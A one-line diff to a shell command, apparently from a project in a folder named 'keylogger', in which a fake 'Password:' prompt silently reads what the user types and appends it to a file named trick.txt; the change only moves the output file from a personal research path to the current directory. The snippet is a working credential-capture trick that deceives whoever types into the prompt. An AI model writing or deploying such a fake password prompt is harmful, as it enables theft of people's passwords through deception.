@@ -1,1 +1,1 @@
-read -sp 'Password: '; echo; echo $REPLY | vis >> /Users/alexclevenger/Documents/research/keylogger/trick.txt;
+read -sp 'Password: '; echo; echo $REPLY | vis >> ./trick.txt;
